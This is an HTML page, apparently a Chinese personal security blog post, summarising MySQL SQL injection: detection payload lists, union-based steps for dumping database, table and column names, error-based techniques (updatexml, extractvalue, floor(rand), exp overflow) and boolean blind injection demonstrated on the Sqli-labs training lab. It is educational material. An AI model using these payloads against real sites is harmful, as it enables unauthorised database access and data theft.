@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.net/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://github.com/fish123123/fish123123.github.io/blob/main/81842C81-B807-4587-B684-140AE3240310_1_201_a.jpeg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="### SQL注入漏洞概述
+
+#### 什么是SQL注入
+
+SQL注入（SQLi）是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。">
+<meta property="og:title" content="mysql注入总结">
+<meta property="og:description" content="### SQL注入漏洞概述
+
+#### 什么是SQL注入
+
+SQL注入（SQLi）是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://fish123123.github.io/post/mysql-zhu-ru-zong-jie.html">
+<meta property="og:image" content="https://github.com/fish123123/fish123123.github.io/blob/main/81842C81-B807-4587-B684-140AE3240310_1_201_a.jpeg">
+<title>mysql注入总结</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">mysql注入总结</h1>
+<div class="title-right">
+    <a href="https://fish123123.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/fish123123/fish123123.github.io/issues/4" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3>SQL注入漏洞概述</h3>
+<h4>什么是SQL注入</h4>
+<p>SQL注入（SQLi）是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，SQL语句带入数据库使恶意SQL语句得以执行可以查看通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，从而导致应用程序的内容或行为发生持续变化。<br>
+在某些情况下，攻击者可以升级SQL注入攻击以破坏底层服务器或其他后端基础架构或执行拒绝服务攻击。</p>
+<h3>SQL 注入类型分类</h3>
+<ul>
+<li>从注入参数类型分：数字型注入、字符型注入</li>
+<li>从注入效果分：报错注入、无显盲注（布尔盲注、延时盲注）、联合注入、堆叠注入、宽字节注入、二次注入</li>
+<li>从提交方式分：GET注入、POST注入、HTTP头注入（UA注入、XFF注入）、COOKIE注入</li>
+</ul>
+<h3>SQL 注入的常见位置</h3>
+<ul>
+<li>URL参数：攻击者可以在应用程序的 URL 参数中注入恶意 SQL 代码，例如在查询字符串或路径中</li>
+<li>表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标</li>
+<li>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，攻击者可以通过修改 Cookie 中的值来进行 SQL 注入</li>
+<li>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，攻击者可以在 HTTP 头部中注入恶意 SQL 代码。</li>
+<li>数据库查询语句：在应用程序中直接拼接 SQL 查询语句的地方，如果没有正确地对用户输入进行过滤和转义，就可能导致 SQL 注入漏洞</li>
+</ul>
+<h3>如何判断是否存在 SQL 注入</h3>
+<ul>
+<li>单双引号判断</li>
+<li>and 型判断</li>
+<li>or 或 xor 判断</li>
+<li>exp(709) exp(710)</li>
+</ul>
+<p>测试payload：</p>
+<pre class="notranslate"><code class="notranslate">'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+%00
+/*…*/ 
++		addition, concatenate (or space in url)
+||		(double pipe) concatenate
+%		wildcard attribute indicator
+
+@variable	local variable
+@@variable	global variable
+
+
+# Numeric
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+
+
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY columnnames having 1=1 --
+
+
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+
+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1	
+
+' AND MID(VERSION(),1,1) = '5';
+
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name &gt; '.') --
+
+
+Finding the table name
+
+
+Time-Based:
+,(select * from (select(sleep(10)))a)
+%2c(select%20*%20from%20(select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+
+Comments:
+
+#	    Hash comment
+/*  	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	    Backtick
+</code></pre>
+<h3>SQL语句基础</h3>
+<h4>注释</h4>
+<ul>
+<li><code class="notranslate">#</code>：不建议直接使用，会被浏览器当做 URL 的书签，建议使用其 URL 编码形式<code class="notranslate">%23</code></li>
+<li><code class="notranslate">--+</code>：本质上是<code class="notranslate">--空格</code>，<code class="notranslate">+</code>会被浏览器解释为空格，也可以使用 URL 编码形式<code class="notranslate">--%20</code></li>
+<li><code class="notranslate">/**/</code>：多行注释，常被用作空格</li>
+<li><code class="notranslate">/*! */</code>：内联注释</li>
+</ul>
+<h4>函数</h4>
+<ul>
+<li><code class="notranslate">group_concat()</code>：使数据在一列中输出</li>
+<li><code class="notranslate">concat_ws()</code>：就是为了区分列的界限，<code class="notranslate">concat_ws('字符',字段1,字段2,.....)</code></li>
+<li><code class="notranslate">database()</code>：主要是返回当前（默认）数据库的名称</li>
+</ul>
+<h3>联合注入</h3>
+<h4>第一步-类型判断</h4>
+<p>判断是否存在注入，若存在，则判断是字符型还是数字型，简单来说就是数字型不需要符号包裹，而字符型需要</p>
+<p>数字型：<code class="notranslate">select * from table where id =$id</code><br>
+字符型：<code class="notranslate">select * from table where id='$id'</code></p>
+<p>判断类型一般可以使用 and 型结合永真式和永假式</p>
+<p>判断数字型：</p>
+<pre class="notranslate"><code class="notranslate">1 and 1=1 #永真式   select * from table where id=1 and 1=1
+1 and 1=2 #永假式   select * from table where id=1 and 1=2
+#若永假式运行错误，则说明此SQL注入为数字型注入
+</code></pre>
+<p>判断字符型：</p>
+<pre class="notranslate"><code class="notranslate">1' and '1'='1
+1' and '1'='2
+#若永假式运行错误，则说明此SQL注入为字符型注入
+</code></pre>
+<h4>第二步-查字段个数</h4>
+<p>使用<code class="notranslate">order by</code>查询字段个数，上一步我们已经判断出了是字符型还是数字型；</p>
+<p>使用<code class="notranslate">order by 数字</code>来查询字段的个数，这里的关键是找到<strong>临界值</strong>，例如<code class="notranslate">order by 4</code>时候还在报错，但是<code class="notranslate">order by 3</code>时没有出现报错，3 就是这里的临界值，说明这里存在 3 个字段</p>
+<pre class="notranslate"><code class="notranslate">?id=1' order by 3%23
+</code></pre>
+<h4>第三步-查找显示位</h4>
+<p>使用<code class="notranslate">union select</code>查找显示位，上一步我们已经知道了字段的具体个数，现在我们要判断这些字段的哪几个会在前端显示出来，这些显示出来的字段叫做显示位，我们使用<code class="notranslate">union select 1,2,3.....(字段个数是多少个就写到几)</code>来对位置的顺序进行判断（其中数字代表是几号显示位）</p>
+<p>这里我们需要对框架做一下微调，也就是将 1 改为 -1，<strong>这里修改的目的是查询一个不存在的 id，使得第一句为空，显示第二句的结果</strong>;</p>
+<pre class="notranslate"><code class="notranslate">?id=-1' union select 1,2,3%23
+</code></pre>
+<h4>第四步-爆库名</h4>
+<p>使用<code class="notranslate">database()</code>函数爆出库名，<code class="notranslate">database()</code>函数主要是返回当前（默认）数据库的名称，这里我们把它用在哪个显示位上都可以;</p>
+<pre class="notranslate"><code class="notranslate">?id=-1' union select 1,2,database()%23
+</code></pre>
+<h4>第五步-爆表名</h4>
+<p>基于库名使用<code class="notranslate">table_name</code>爆出表名，先来介绍一下使用到的函数和数据源：</p>
+<ul>
+<li><code class="notranslate">group_concat()</code>函数：使数据在一列中输出</li>
+<li><code class="notranslate">information_schema.tables</code>数据源：存储了数据表的元数据信息，我们主要使用此项数据源中的<code class="notranslate">table_name</code>和<code class="notranslate">table_schema</code>字段;</li>
+</ul>
+<p>最终可以构造出 Payload 如下，可以获取到数据库中存在的几张表；</p>
+<pre class="notranslate"><code class="notranslate">?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23
+</code></pre>
+<h4>第六步-爆列名</h4>
+<p>基于表名使用column_name爆出列名，此时数据源为information_schema.columns，位置在table_name='表名'(记得给表名加单引号)</p>
+<p>最终构造 Payload 如下，可以获取到相应字段；</p>
+<pre class="notranslate"><code class="notranslate">?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' %23
+</code></pre>
+<h4>第七步-爆信息</h4>
+<p>使用列名爆敏感信息，直接 from 表名即可，这里需要使用<code class="notranslate">group_concat(concat_ws())</code>实现数据的完整读取，<code class="notranslate">group_concat()</code>函数在前面几步就接触过，主要是使数据在一列中输出</p>
+<p>这就带来了一个问题，如果直接把列放入<code class="notranslate">group_concat()</code>函数，列间的界限就不清晰了，<code class="notranslate">concat_ws()</code>就是为了区分列的界限所使用的，其语法如下：</p>
+<pre class="notranslate"><code class="notranslate">concat_ws('字符',字段1,字段2,.....)
+</code></pre>
+<p>最终我们便可以构造出获取数据的 Payload：</p>
+<pre class="notranslate"><code class="notranslate">?id=-1'union select 1,2,group_concat(concat_ws('-',id,email_id)) from 表名 %23
+</code></pre>
+<h3>报错注入</h3>
+<p>报错注入的本质是使用一些指定的函数制造报错，从而从报错信息获得我们想要的内容，使用前提是<strong>后台没有屏蔽数据库的报错信息，且报错信息会返回到前端，报错注入一般在无法确定显示位的时候使用</strong>，我们先来了解一下报错注入的类型和会用到的函数。</p>
+<h4>XPath 导致的报错</h4>
+<p>updatexml()函数和extractvalue()函数都可以归类为是 XPath 格式不正确或缺失导致报错的函数。</p>
+<h5>updatexml() 函数</h5>
+<p><code class="notranslate">updatexml()</code>函数本身是改变 XML 文档中符合条件的值，其语法如下：</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">updatexml(XML_document,XPath_string,new_value)</pre></div>
+<p>语法中使用到以下三个参数</p>
+<ul>
+<li>XML_document：XML 文档名称，使用 String 格式作为参数</li>
+<li>XPath_string：路径，XPath 格式，<code class="notranslate">updatexml()</code>函数如果<strong>这项参数错误便会导致报错，我们主要利用的也是这个参数</strong></li>
+<li>new_value：替换后的值，使用 String 格式作为参数</li>
+</ul>
+<div class="highlight highlight-source-sql"><pre class="notranslate">updatexml(<span class="pl-c1">1</span>,concat(0x7e,(<span class="pl-k">select</span> database()),0x7e),<span class="pl-c1">1</span>);</pre></div>
+<h5>extractvalue() 函数</h5>
+<p>extractvalue()函数本身用于在 XML 文档中查询指定字符，语法如下：</p>
+<p>extractvalue(XML_document,xpath_string)</p>
+<p>语法中使用到以下两个参数</p>
+<ul>
+<li>XML_document：XML 文档名称，使用 String 格式作为参数</li>
+<li>XPath_string：路径，XPath 格式，extractvalue()函数也在这里产生报错</li>
+</ul>
+<div class="highlight highlight-source-sql"><pre class="notranslate">extractvalue(<span class="pl-c1">1</span>,concat(0x7e,(<span class="pl-k">select</span> database()),0x7e));</pre></div>
+<h4>主键重复导致的报错</h4>
+<p>主键报错注入是由于rand()，count() ，floor()三个函数和一个group by语句联合使用造成的，缺一不可</p>
+<h5>rand() 函数</h5>
+<p><code class="notranslate">rand()</code>函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，<code class="notranslate">rand()</code>函数会返回一个<code class="notranslate">[0,1)</code>范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列</p>
+<p>在 Mysql 中，只要输入种子，一定返回一个可复现的随机数序列，这里还有一个小细节，<strong>种子是只取整数部分的，使用小数点后第一位进行四舍五入取整</strong></p>
+<h5>floor() 函数</h5>
+<p><code class="notranslate">floor()</code>函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是<strong>直接留下整数位，去掉小数位，如果是负数则整数位需要加一</strong></p>
+<h5>count() 函数</h5>
+<p><code class="notranslate">count()</code>是聚合函数的一种，是 SQL 的基础函数，除此以外，还有<code class="notranslate">sum()</code>、<code class="notranslate">avg()</code>、<code class="notranslate">min()</code>、<code class="notranslate">max()</code>等聚合函数，语法如下</p>
+<pre class="notranslate"><code class="notranslate">select count(字段) from 表名; --得到该列值的非空值的行数
+
+select count(*) from 表名; --用于统计整个表的行数
+</code></pre>
+<h5>group by 语句</h5>
+<p><code class="notranslate">group by</code>语句的用法如下，它用于结合聚合函数，根据一个或多个列对结果集进行分组</p>
+<pre class="notranslate"><code class="notranslate">group by 列名;
+</code></pre>
+<p>深入一下它的工作原理，<code class="notranslate">group by</code>语句在执行时，会依次查出表中的记录并创建一个临时表（这个临时表是不可见的），<code class="notranslate">group by</code>的对象便是该临时表的主键（level），如果临时表中已经存在该主键，则将值加1，如果不存在，则将该主键<strong>插入</strong>到临时表中</p>
+<h5>报错原因分析</h5>
+<p><code class="notranslate">floor()</code>报错注入是利用下方这个相对固定的语句格式，导致的数据库报错</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate"><span class="pl-k">select</span> <span class="pl-c1">count</span>(<span class="pl-k">*</span>),(floor(rand(<span class="pl-c1">0</span>)<span class="pl-k">*</span><span class="pl-c1">2</span>)) x <span class="pl-k">from</span> users <span class="pl-k">group by</span> x</pre></div>
+<p>我们先来分析<code class="notranslate">(floor(rand(0)*2))</code>在 SQL 语句中的含义，我们先来看它的内层<code class="notranslate">rand(0)*2</code>，以 0 为种子使用<code class="notranslate">send()</code>函数生成随机数序列，并且将数列中的每一项结果乘以 2</p>
+<p>再将乘以 2 后的结果放入<code class="notranslate">floor()</code>函数取整，最后得出伪随机数列如下，因为使用了固定的随机数种子0，他每次产生的随机数列的前六位都是相同的0 1 1 0 1 1的顺序</p>
+<p>这时我们思考一个问题，基于上面<code class="notranslate">group by</code>语句的工作原理，我们可以知道，主键重复了就会使<code class="notranslate">count(*)</code>的值加 1，最终只是<code class="notranslate">count(*)</code>的值不同，那为什么说是主键重复导致的报错呢？</p>
+<p>其实是这里有一个细节没有介绍，当<code class="notranslate">group by</code>语句与<code class="notranslate">rand()</code>函数一起使用时，Mysql 会建立一张临时表，这张临时表有两个字段，一个是主键，一个是<code class="notranslate">count(*)</code>，此时临时表无任何值，Mysql 先计算<code class="notranslate">group by</code>后面的值，也就是<code class="notranslate">floor()</code>函数（它们之间是以<code class="notranslate">x</code>作为媒介传递的），<strong>如果此时临时表中没有该主键，则在插入前<code class="notranslate">rand()</code>函数会再计算一次</strong></p>
+<p>上面提到固定序列的第一个值为 0，Mysql 查询临时表，发现没有主键为 0 的记录，因此将此数据插入，这时因为<strong>临时表中没有该主键</strong>，Mysql 插入的过程中还会计算一次<code class="notranslate">group by</code>后面的值，也就是<code class="notranslate">floor()</code>函数，但是此时<code class="notranslate">floor()</code>函数的结果为固定序列的第二个值，因此插入的主键为1，<code class="notranslate">count(*)</code>也为1</p>
+<h4>数据溢出导致的报错</h4>
+<h5>exp() 函数</h5>
+<p>MySQL 中的<code class="notranslate">exp()</code>函数用于将 e 提升为指定数字 x 的幂，也就是 $e^{x}$</p>
+<pre class="notranslate"><code class="notranslate">exp(x)
+</code></pre>
+<p>例如<code class="notranslate">exp(2)</code>就是 $e^{2}$</p>
+<p>我们可用利用 Mysql Double 数值范围有限的特性构造报错，一旦结果超过范围，<code class="notranslate">exp()</code>函数就会报错，这个分界点就是 709，当<code class="notranslate">exp()</code>函数中的数字超过 709 时就会产生报错</p>
+<p>当 MySQL 版本大于 5.5.53 时，<code class="notranslate">exp()</code>函数报错无法返回查询结果，只会得到一个报错，所以在真实环境中使用它做注入局限性还是比较大的，但是可以用判断是否存在 SQL 注入</p>
+<h5>pow() 函数</h5>
+<p>MySQL 中的<code class="notranslate">pow()</code>函数用于将 x(基数) 提升为 y(指数) 的幂，也就是 $x^{y}$，语法如下</p>
+<pre class="notranslate"><code class="notranslate">pow(x,y)
+</code></pre>
+<p>报错原理和<code class="notranslate">exp()</code>函数一样，超出了 Mysql Double 数值的范围，导致报错</p>
+<h4>空间数据类型导致的错误</h4>
+<p>这类报错因为 Mysql 版本限制导致用的比较少，这里列出来，大家有兴趣的话可以做一下深入研究，简单来说，这类函数报错的原因是<strong>函数对参数要求是形如（1 2,3 3,2 2 1）这样几何数据，如果不满足要求，则会报错</strong>，可以产生报错的函数如下：</p>
+<pre class="notranslate"><code class="notranslate">geometrycollection()
+multiponint()
+polygon()
+multipolygon()
+linestring()
+multilinestring()
+</code></pre>
+<h3>无显注入（盲注）</h3>
+<p>无显注入适用于无法直接从页面上看到注入语句的执行结果，甚至连注入语句是否执行都无从得知的情况，这种情况我们就要利用一些特性和函数<strong>自己创造判断条件</strong></p>
+<h4>基于布尔的盲注</h4>
+<p>在介绍布尔盲注的原理前，先来了解一下它用到的函数</p>
+<h4>常用函数</h4>
+<ul>
+<li>
+<p><code class="notranslate">left()</code>函数：从左边截取指定长度的字符串</p>
+<pre class="notranslate"><code class="notranslate">left(指定字符串，截取长度)
+</code></pre>
+</li>
+<li>
+<p><code class="notranslate">length()</code>函数：获取指定字符串的长度</p>
+<pre class="notranslate"><code class="notranslate">length(指定字符串)
+</code></pre>
+</li>
+<li>
+<p><code class="notranslate">substr()</code>函数和<code class="notranslate">mid()</code>函数：截取字符串，可以指定起始位置（从 1 开始计算）和长度</p>
+<pre class="notranslate"><code class="notranslate">substr(字符串，起始位置，截取长度)
+mid(字符串，起始位置，截取长度)
+</code></pre>
+</li>
+<li>
+<p><code class="notranslate">ascii()</code>函数：将指定字符串进行 ascii 编码</p>
+<pre class="notranslate"><code class="notranslate">ascii(指定字符串)
+</code></pre>
+<p>### 布尔盲注原理</p>
+</li>
+</ul>
+<p>布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断，这里我们用 Sqli-labs 第八关帮助大家理解它</p>
+<p>先添加参数<code class="notranslate">?id=1</code></p>
+<p>先用单引号判断类型，发现添加单引号后并没有报错，但是 You are in... 消失了，这里也就为我们判断创造了条件，<strong>后面我们就需要观察 You are in... 是否出现，找不同情况</strong></p>
+<p>这里我们再添加一个单引号，发现 You are in... 出现，则本关为字符型注入，使用单引号包裹</p>
+<p>因为这里只会回显真或假，无法直接拿到数据库的名字，但是我们可以降低一点条件，可以<strong>先判断出数据库名的长度（最长为 30），这里可以先给一个范围，观察一下回显（二分法）</strong></p>
+<pre class="notranslate"><code class="notranslate">//先猜测数据库名是否比5长，发现为真
+1' and length(database())&gt;5--+
+
+//再判断数据库是否比10长，发现为假
+1' and length(database())&gt;10--+
+
+//此时数据库大于5小于等于10，依次尝试可以发现长度为8
+1' and length(database())=8--+
+</code></pre>
+<p>拿到长度后，我们使用<code class="notranslate">substr()</code>函数或<code class="notranslate">mid()</code>函数一位一位的猜测数据库字符，Mysql 库名一共可以使用 63 个字符，分别是：<code class="notranslate">a-z</code>、<code class="notranslate">A-Z</code>、<code class="notranslate">0-9</code>、<code class="notranslate">_</code></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+</div>
+    <div id="footer">Copyright © <span id="year"></span><a href="https://fish123123.github.io"> Youyu </a>
+<p><a href="https://beian.miit.gov.cn/" target="_blank">nonono</a>
+<span id="runday"></span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a>
+</p>
+
+<script>
+if("12/01/2023"!=""){
+    var now=new Date();
+    var startSite=new Date("12/01/2023");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("year").innerHTML=now.getFullYear();
+    if("nonono"!=""){document.getElementById("runday").innerHTML=" • "+"网站运行"+diffDay+"天"+" • ";}
+    else{document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";}
+}
+</script>
+</div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n\n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","fish123123/fish123123.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+</script>
+
+
+<script>MathJax = {tex: {inlineMath: [["$", "$"]]}};</script><script async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</html>
